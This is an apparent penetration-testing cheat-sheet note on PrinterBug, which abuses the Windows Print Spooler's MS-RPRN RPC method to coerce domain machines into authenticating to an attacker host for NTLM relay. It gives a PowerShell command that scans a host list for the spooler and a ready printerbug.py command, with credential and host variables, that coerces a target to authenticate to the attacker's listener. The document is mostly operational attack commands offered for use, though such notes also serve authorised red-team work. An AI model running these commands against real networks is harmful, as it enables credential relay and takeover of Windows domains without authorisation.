---
technique: PrinterBug
category: print-spooler
targets: Windows Print Spooler Service
protocols: SMB, RPC
remote_capable: true
tags: print-spooler coercion printerbug ms-rprn rpc smb ntlm-relay
---

# PrinterBug

PrinterBug abuses the MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx` method to force any machine running the Print Spooler service to authenticate to an attacker-controlled host. Any domain user can trigger this. For full exploitation detail and tool commands, see the [MS-RPRN](../mitm/ms-rprn.md) note.

## Windows

### Step 1: Import SpoolerScanner module

#powershell #recon

Import the Get-SpoolStatus module before scanning hosts for Print Spooler availability.

```powershell title:"Import SpoolerScanner module"
Import-Module .\Get-SpoolStatus.ps1
```
<!-- cheat -->

### Step 2: Scan hosts for spooler (SpoolerScanner)

#powershell #recon

Check whether the Print Spooler service is available on each host in a target list.

```powershell title:"Scan hosts for Print Spooler availability with SpoolerScanner"
ForEach ($server in Get-Content servers.txt) { Get-SpoolStatus $server }
```
<!-- cheat
-->

## Linux

### printerbug

#python #coercion #password

Trigger the Print Spooler service on the target to coerce authentication to the attacker's listener.

```sh title:"Coerce Print Spooler authentication with printerbug"
printerbug.py "$domain"/"$user":"$pass"@"$rhost" "$lhost"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var rhost
-->
